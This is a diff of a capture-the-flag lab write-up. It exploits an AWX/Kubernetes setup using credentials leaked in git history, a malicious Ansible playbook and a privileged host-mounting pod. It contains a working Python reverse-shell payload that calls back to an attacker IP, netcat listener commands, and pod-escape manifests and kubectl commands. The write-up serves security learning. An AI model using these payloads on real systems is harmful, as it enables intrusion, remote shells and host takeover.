@@ -4,7 +4,7 @@ We have located Monkey Business operator blog where they are leaking personal in
 
 ## Enum
 
-We are given an IP so to start without we do a quick nmap scan
+We are given an IP so to start without we can do a quick nmap scan
 
 ```
 nmap -p- -oA fulltcp -vv 10.129.254.76
@@ -23,15 +23,16 @@ PORT      STATE SERVICE   REASON
 A few interesting things open, port 8443 and 10250 both seem to relate to kubernetes APIs. 3000 was a instance of git, and 30080 an instance of AWX.
 
 
-Note: I hadn't realised the enviroment would shutdown prior as soon as I submitted the flag, so most the screenshots are from burp render or a local instance of AWX.
+Note: I hadn't realised the enviroment would shutdown as soon as I submitted the flag, so most the screenshots are from burp render or a local instance of AWX.
 
 
 ## 80 - Webserver
 
-The initial webserver didn't seem to have much going on, included a link to a dump of user details on git `http://operator.htb:3000/MonkeyBusiness/personal-uk-leak-2022`.  
+The initial webserver didn't seem to have much going on, but included a link to a dump of user details on git `http://operator.htb:3000/MonkeyBusiness/personal-uk-leak-2022`.  
 
 ![inital website on port 80 ](images/initial_website.png)
 
+*Figure 1: MonkeyLeak web page on port 80*
 
 ## 3000 - Gogs GIT
 
@@ -39,10 +40,13 @@ An instance of gogs was running which let us register a new account.
 
 ![GOGS website home page](images/gogs_git.png)
 
+*Figure 2: Gogs (git) on port 3000*
 
 After signing up and browsing around, we see a public repo for awx-operator, which is likely the service being hosted at `http://10.129.254.76:30080/#/`
 
 ![aws operator repo on git](awx_operator_repo.png)
+
+*Figure 3: awx-operator repo*
 
 When reviewing issues we see the following exchange.
 
@@ -56,11 +60,11 @@ Sure enough we find the repo whening browse to `http://10.129.254.76:3000/Monkey
 
 ![awx k8 config repo](images/awx_k8s_config_repo.png)
 
+*Figure 4: repo kuberenetes config*
 
 Looking at revision history `http://10.129.254.76:3000/MonkeyBusiness/awx-k8s-config/commit/ddee38cef444421bce6ac66509377229c09659fc` we see that the AWX creds were initially commited before being removed.
 
 ```
-
 name: monkey-business-admin-password
 namespace: awx
 metadata:
@@ -74,16 +78,27 @@ We can use this password from the repo to login as admin to awx `http://10.129.2
 
 ![AWX landing page](images/awx_landing_page.png)
 
+*Figure 5: Landing page for AWX*
 
-After logging in we can a few defined projects and templates. 
-I'm not overally faimiliar with AWX however it seems AWX/anisble allows you to define jobs to be run which automate tasks based on playbooks.
+After logging in we can a few defined projects and templates. I'm not overally faimiliar with AWX however it seems AWX/anisble allows you to define jobs to be run which automate tasks based on playbooks.
 
 So our aim should be to see if we can get it to run malicous code we supply.
 
-When reviewing projects we can the demo app, has been set up to pull from git. So we can create our own repo on git and see if we can create project using that.
+When reviewing projects we can see the demo app has been set up to pull from git. 
+So let create our own project to pull froma  repo we control.
 
-Create a repo with the account we previously registered, i've used `first_playbook` as the name, then create a yml file containing our reverse shell command using `ansible.builtin.shell`.
+First setup our maliciosu repo
 
+Create a repo with the account we previously registered, i've used `first_playbook` as the name of the repo, then create a yml file containing our reverse shell command using `ansible.builtin.shell`.
+
+first_playbook.yml
+```yaml
+- name: Hello World Sample
+  hosts: all
+  tasks:
+    - name: Hello Message
+      ansible.builtin.shell: python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.48",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+```
 
 
 ```
@@ -112,25 +127,21 @@ To http://operator.htb:3000/test1/first_playbook.git
 Branch 'master' set up to track remote branch 'master' from 'origin'.  
 ```
 
-first_playbook.yml
-```yaml
-- name: Hello World Sample
-  hosts: all
-  tasks:
-    - name: Hello Message
-      ansible.builtin.shell: python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.48",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
-```
 
 ![Repo of yaml playbook with reverseshell](images/repo_firstplaybook.png)
 
+*Figure 6: Our malicous repo*
 
 Now navigating back to AWX we want to setup a project to use the playbook from our repo.
+
 We can do that by going to Resources > Projects > Add
 Select source control type: Git
 Input our source control URL `http://10.129.254.76:3000/test1/first_playbook`
-Then save the project
+Then save the project.
 
 ![Adding a new project](images/adding_new_project.png)
+
+*Figure 7: Creating a new project in AWX*
 
 Once you've saved, AWX will reach out to the repo and try to sync.
 
@@ -142,10 +153,9 @@ Navigate to Job Template and add a new one, select the project you just created,
 
 ![creating a new job](images/create_new_job.png)
 
+*Figure 8: Creating a new job template*
 
-Setup netcat listener for our shell and run
-
-Now from the templates menu we can click launch template 
+Setup netcat listener to catch our shell and run the job. This can be done from the templates menu click the rocket ship `launch template`.
 
 ```
 netcat -lvkp 80 
@@ -156,12 +166,12 @@ cat: /var/run/secrets/kubernetes.io/serviceaccount: No such file or directory
 
 ```
 
-However I quickly realised I had no idea, where to go next. There didn't even seem to be kubernetes token in the normal spots.
+However I quickly realised I had no idea where to go next. There didn't even seem to be kubernetes token in the normal spots.
 
-After some enumeration I went back to the AWX instance, and found out why.
+After some enumeration I went back to the AWX website, and found out why.
 
 
-Navaging to instance groups > default > edit >check the box for customize pod specification
+Navaging to instance groups > default > edit > check the box for customize pod specification
 
 ```
 apiVersion: v1
@@ -209,13 +219,14 @@ spec:
 ```
 
 
-We can now find the kubernetes token, howver am once again faced with an issue the service account is running as `automation-job-60-9snsw` and has very little in the way of permissions
+We can now find the kubernetes token, howver once again faced with an issue the service account is running as `automation-job-60-9snsw` and has very little in the way of permissions.
 
-Once again going back to AWX, and reviewing the configation a bit more. There is a line `serviceAccountName: default` well what if we change this to another account we know has more permissions.
+Going back to AWX, and reviewing the configation a bit more. There is a line `serviceAccountName: default` well what if we change this to another account we know has more permissions.
 
-In the repo for the k8 config we see an account defined `awx-operator-controller-manager` which has a number of permissions, this is likely the account that is used to spawn the individual pods. 
+In the repo for the k8 config we see an account defined `awx-operator-controller-manager` which has a number of permissions, this is likely the account that is used to spawn the individual pods. This is also probably just the default service account name and could be found publically.
 
 ![awx operator repo](images/awx-operator.png)
+*Figure 9: kubernetes config containing service account name*
 
 Once again update the pod specification
 
@@ -299,11 +310,13 @@ selfsubjectrulesreviews.authorization.k8s.io    []                              
 ```
 
 Since we have permission to create pods, let try to create a privileged one that does everything wrong like mount the host system.
-I've essentially taken the yaml file from this awesome project by bishop fox `https://github.com/BishopFox/badPods/tree/main/manifests/everything-allowed`
+I've essentially taken the yaml file from this awesome project from bishop fox `https://github.com/BishopFox/badPods/tree/main/manifests/everything-allowed`
 
 
-I made a slight change by adding `runAsUser:0` so we'd be able to drop into the container as root. 
+I made a slight a couple of change to configuration to get it work:
 
+- Adding `runAsUser:0`  under securityContext so we'd be able to drop into the container as root. 
+- Changing the image to one the system had available, as it didn't have internet connectivty to pull a new image. `image: quay.io/ansible/awx-operator:latest`  and telling it not to try to pull the image from the internet `imagePullPolicy: IfNotPresent`
 
 p1.yml
 ```
@@ -337,13 +350,13 @@ spec:
 
 ```
 
-Create the pod and drop into a shell
+Create the pod and drop into a shell.
 ```
 k create -f p1.yml -n awx
 k exec -n awx -it  everything-allowed-exec-pod -- /bin/bash
 ```
 
-Once in we can navigate to the host system under `/host` and find the flag
+Once in we can navigate to the host system under `/host` and find the flag.
 
 ```
 bash-4.4# cat /host/root/flag.txt   
